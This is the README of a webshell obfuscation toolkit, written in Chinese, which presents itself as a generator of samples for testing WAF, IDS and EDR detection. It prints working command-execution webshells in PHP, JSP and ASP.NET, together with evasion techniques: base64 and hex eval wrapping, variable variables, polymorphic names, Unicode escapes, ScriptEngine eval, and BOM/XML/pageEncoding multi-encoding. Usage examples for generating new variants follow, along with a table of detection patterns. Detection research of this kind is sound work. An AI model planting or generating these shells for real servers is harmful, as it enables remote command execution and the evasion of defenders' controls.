# webshell-obfuscation

Webshell混淆工具包，用于生成可用于测试WAF/IDS/EDR检测规则的混淆样本。

## 来源

本工具基于以下安全研究项目和技术：

- [tennc/webshell](https://github.com/tennc/webshell) - 各种语言的webshell样本集
- [useful-code](https://github.com/tennc/useful-code) - 安全研究代码片段
- Invoke-DOSfuscation (cmd-obfuscation) - 命令混淆技术

## 混淆技术

### PHP 混淆技术

#### 1. Base64 Wrapping

将代码base64编码后用eval执行。

```php
<?php @eval(base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='));?>
```

**原理**: 将webshell代码base64编码，eval执行时动态解码。

#### 2. Nested Base64

多层base64嵌套编码。

```php
<?php @eval(base64_decode('YmFzZTY0X2RlY29kZSgnWW1GelpUWTBYMlJsWTI5a1pTZ25VRVE1ZDJGSVFXZGpNMng2WkVkV2RFdERVbVpTTUZaVlYzbGthbUpYVVc1WVUyczNVSG8wUFNjcCcp'));?>
```

**原理**: 多层编码增加分析难度，每层需要逐层解码。

#### 3. Hex Encoding

将代码转换为十六进制字符串。

```php
<?php @eval('\x3c\x3f\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b\x3f\x3e');?>
```

**原理**: 将PHP代码转换为十六进制表示，eval执行时解析。

#### 4. String Concatenation

拆分函数名和字符串。

```php
<?php sys"tem"($_GET["cmd"]);?>
```

**原理**: 利用PHP字符串可拼接特性，拆分关键字。

#### 5. Variable Variables

使用`${${...}}`访问变量。

```php
<?php ${${"GET"}}['cmd']?>  <!-- 等价于 $_GET['cmd'] -->
```

**原理**: 利用可变变量绕过关键字检测。

#### 6. Polymorphic

随机变量名多态。

```php
<?php $klwdku='PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=';$bbimjr=base64_decode($klwdku);@$bbimjr($bbimjr);?>
```

**原理**: 动态变量名和函数指针调用。

### JSP 混淆技术

#### 1. Unicode Escape

将代码转换为Unicode转义序列。

```jsp
\u003c\u0025= new ProcessBuilder("cmd".split("\c")).start().getInputStream()
```

**原理**: JSP解析器支持Unicode转义，可绕过字符串匹配。

#### 2. Scriptlet Tag

使用`<jsp:scriptlet>`替代`<%`。

```jsp
<jsp:scriptlet>new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next()</jsp:scriptlet>
```

**原理**: 不同的标签可能绕过基于`<%`的检测规则。

#### 3. Reflection API

使用Java反射API动态执行。

```jsp
<%@ page import="java.lang.reflect.*" %>
<%
String cmd = request.getHeader("X-Command");
// 使用反射调用系统方法
%>
```

**原理**: 动态方法调用可绕过关键字检测。

#### 4. ScriptEngine

使用Java ScriptEngine执行JS代码。

```jsp
<%
javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByExtension("js");
engine.eval(new String(new sun.misc.BASE64Decoder().decodeBuffer(request.getInputStream())));
%>
```

**原理**: 将payload编码在request body中，ScriptEngine动态执行。

#### 5. JSP Multi-Encoding

Tomcat对JSP文件的编码识别顺序：
1. BOM (字节顺序标记) - 前4个字节
2. `<?xml encoding='xxx'?>` - XML声明中的encoding属性
3. `<%@ page pageEncoding="xxx"%>` - page指令的pageEncoding属性

**关键编码组合**:
- 支持的BOM编码: `utf-8`, `utf-16be`, `utf-16le`, `iso-10646-ucs-4`, `cp037`

**5.1 双编码 - BOM + XML Encoding**

```python
# BOM (utf-8) + xml encoding (cp037/EBCDIC)
a0 = '<?xml version="1.0" encoding=\'cp037\'?>'.encode('utf-8')  # BOM part
a1 = jsp_code.encode('cp037')  # Content part
result = a0 + a1
```

**原理**: BOM识别初始编码，XML encoding属性覆盖后续内容的编码。

**5.2 双编码 - BOM + pageEncoding**

```python
# BOM (utf-8) + pageEncoding directive (utf-16be)
bom = b'\xef\xbb\xbf'  # UTF-8 BOM
page_directive = '<%@ page pageEncoding="utf-16be"%>'.encode('utf-8')
content = jsp_code.encode('utf-16be')
result = bom + page_directive + content
```

**原理**: pageEncoding指令可以放置在文件任意位置。

**5.3 三重编码 - BOM + XML Encoding + pageEncoding**

```python
# bom(utf-8) + xml(cp037) + pageEncoding(utf-16be)
# 1. BOM -> utf-8 initial encoding
# 2. <?xml encoding='cp037'?> -> override to cp037 for xml declaration
# 3. <%@ page pageEncoding="utf-16be"%> -> override to utf-16be for rest
```

**注意**: 多字节编码（如utf-16）要求总长度为偶数字节，否则会导致错位！

**5.4 JSP XML格式 (.jspx)**

```jsp
<?xml version="1.0" encoding="utf-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
    <jsp:directive.page contentType="text/html"/>
    <jsp:scriptlet>
        // webshell code here
    </jsp:scriptlet>
</jsp:root>
```

**原理**: 使用标准XML结构，encoding属性控制整个文件编码。

### ASP.NET 混淆技术

#### 1. SOAP Format (.asmx)

SOAP WebService格式。

```aspx
<%@ WebService Language="C#" Class="Service" %>
[WebService(Namespace = "http://tempuri.org/")]
[WebMethod]
public string Test(string Z1, string Z2) {
    ProcessStartInfo c = new ProcessStartInfo(Z1, Z2);
    Process e = Process.Start(c);
    return e.StandardOutput.ReadToEnd();
}
```

**原理**: 利用ASMX SOAP格式通信，参数在XML中传递。

#### 2. Generic Handler (.ashx)

ashx通用处理程序。

```aspx
<%@ WebHandler Language="C#" Class="Handler" %>
public class Handler : IHttpHandler {
    public void ProcessRequest(HttpContext context) {
        string cmd = context.Request.QueryString["cmd"];
        Process.Start(cmd);
    }
}
```

**原理**: ashx是ASP.NET的轻量级处理器，可用于命令执行。

## 检测模式

内置的webshell检测规则（可用于测试WAF/IDS规则）：

| Pattern | Severity | Language | Description |
|---------|----------|----------|-------------|
| `EVAL_BASE64` | high | PHP | eval配合base64解码 |
| `SYSTEM_EXEC` | high | PHP | 直接命令执行函数 |
| `HIDDEN_INPUT` | medium | HTML | 隐藏表单输入 |
| `SCRIPT_ENGINE` | high | Java | Java脚本引擎 |
| `REFLECTION_API` | high | Java | Unsafe反射 |
| `PROCESS_BUILDER` | medium | Java | ProcessBuilder创建 |
| `WEBSERVICE_ASMX` | low | C# | ASP.NET WebService |
| `UNICODE_ESCAPE` | low | JSP | Unicode转义序列 |
| `OBFUSCATED_VAR` | medium | PHP | 可变变量混淆 |
| `ENCODED_PAYLOAD` | high | PHP | 多阶段编码payload |

## 使用方法

### 命令行

```bash
# 列出所有技术
python3 webshell-obfuscation.py --list

# PHP混淆
python3 webshell-obfuscation.py "<?php system(\$_GET['cmd']);?>" --lang php --technique all

# JSP混淆
python3 webshell-obfuscation.py "<%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>" --lang jsp --technique unicode

# 检测模式
python3 webshell-obfuscation.py "<?php @eval(base64_decode(\$_POST['code']));?>" --detect
```

### Python模块

```python
from webshell_obfuscation import obfuscate, detect, list_techniques

# 列出技术
print(list_techniques())

# 混淆webshell
results = obfuscate("<?php system($_GET['cmd']);?>", language="php", technique="all")
for r in results:
    print(f"[{r['technique']}] {r['code']}")

# 检测webshell
matches = detect("<?php @eval(base64_decode($_POST['code']));?>")
print(matches)
```

## 示例

### 示例 1: 基本PHP webshell混淆

```bash
$ python3 webshell-obfuscation.py "<?php system(\$_GET['cmd']);?>" --lang php --technique all

[
  {"technique": "base64", "code": "<?php @eval(base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='));?>"},
  {"technique": "hex", "code": "<?php @eval('\\x3c\\x3f\\x70\\x68\\x70\\x20\\x73\\x79\\x73\\x74\\x65\\x6d...');?>"},
  ...
]
```

### 示例 2: 检测能力测试

```bash
$ python3 webshell-obfuscation.py "<?php @eval(base64_decode(\$_POST['code']));?>" --detect

[
  {"pattern": "EVAL_BASE64", "severity": "high", "match": "eval(base64_decode", "language": "php"}
]
```

### 示例 3: JSP Unicode混淆

```bash
$ python3 webshell-obfuscation.py "<%=Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()%>" --lang jsp --technique unicode

{
  "technique": "unicode",
  "code": "\\u003c\\u0025=Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream()\\u0025\\u003e"
}
```

## 参考项目

- [tennc/webshell](https://github.com/tennc/webshell) - 各种语言的webshell样本库
- [useful-code](https://github.com/tennc/useful-code) - 安全研究代码片段
- [Invoke-DOSfuscation](./cmd-obfuscate.md) - cmd.exe命令混淆工具
- [Y4tacker - 浅谈JspWebshell之编码](https://y4tacker.github.io/2022/11/27/year/2022/11/%E6%B5%85%E8%B0%88JspWebshell%E4%B9%8B%E7%BC%96%E7%A0%81/) - JSP多重编码原理详解

## 许可

本工具仅用于防御性安全研究和检测规则开发。
